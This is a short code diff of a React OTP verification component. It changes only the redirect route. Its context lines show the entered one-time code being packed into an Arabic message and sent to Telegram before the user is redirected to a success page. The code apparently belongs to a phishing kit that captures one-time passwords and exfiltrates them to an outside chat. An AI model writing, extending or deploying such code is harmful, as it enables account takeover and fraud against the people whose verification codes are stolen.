@@ -47,7 +47,7 @@ const OTPVerification = () => {
     if (otp.length === 4) {
       const message = `رمز التحقق OTP\n\nالرمز: ${otp}`;
       await sendToTelegram(message);
-      navigate('/registration-complete');
+      navigate('/success');
     }
   };
 
